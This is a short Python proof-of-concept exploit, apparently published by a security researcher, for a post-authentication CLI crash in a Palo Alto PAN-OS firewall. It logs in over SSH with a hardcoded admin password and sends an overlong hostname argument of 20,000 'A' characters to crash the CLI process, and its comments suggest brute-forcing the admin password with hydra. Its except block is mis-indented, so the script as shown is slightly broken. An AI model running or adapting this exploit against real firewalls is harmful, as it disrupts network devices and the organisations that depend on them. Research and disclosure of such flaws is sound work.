#!/usr/bin/env python3 
# post auth cli memory corruption poc for paloalto 11.1.4-h7 
# 
# 19.01.2025 @ 00:23 
# 
 
# postauth user (in general 'admin'* but we'll get back to that later ;)) 
# can use cli to provide one of the command from menu with too-long hostname 
# as a <value> parameter. 
# 
# that will crash current cli process and session will be terminated. 
# segfault error can be found in 'messages' log file. for details try: 
#   paloalto> less mp-log messages 
# 
# example log: 
# Jan 18 09:28:06 PA-VM kernel: [ 5822.319982] cli[14441]: segfault at 7ffe5c048ff8 
#   ip 00007f111d428c94 sp 00007ffe5c049000 error 6 in libchicken.so[7f111d230000+293000] 
# 
# *(with simple-enough password for admin - hydra should break it) 
# 
# More: https://code610.blogspot.com/2025/05/palo-alto-postauth-cli-memory.html
# 

import netmiko 
from netmiko import ConnectHandler 
import getpass 
import sys 
 
target=sys.argv[1] 
login='admin' 
password='P@ssw0rd' 
 
firewall = { 
    "device_type": "paloalto_panos", 
    "host": target, 
    "username": login, 
    "password": password 
} 
 
# init connection 
connection = ConnectHandler(**firewall) # unpacking the dictionary 
print("[+] Connected to target host: %s" % target) 
 
print("[i] Sending crash command...") 
 
kab00m = "A"*20000 
crash = "test http-server address " + kab00m 
try: 
    output = connection.send_command( crash, expect_string=r">") 
    connection.disconnect() 
except netmiko.exceptions.ReadTimeout as e: 
print("[-] ReadTimeout() error - remote cli should be crashed. Check 'messages' for details.") 
# print(output) 
print("[+] Done. Good luck!") 
# 
# o/ 
#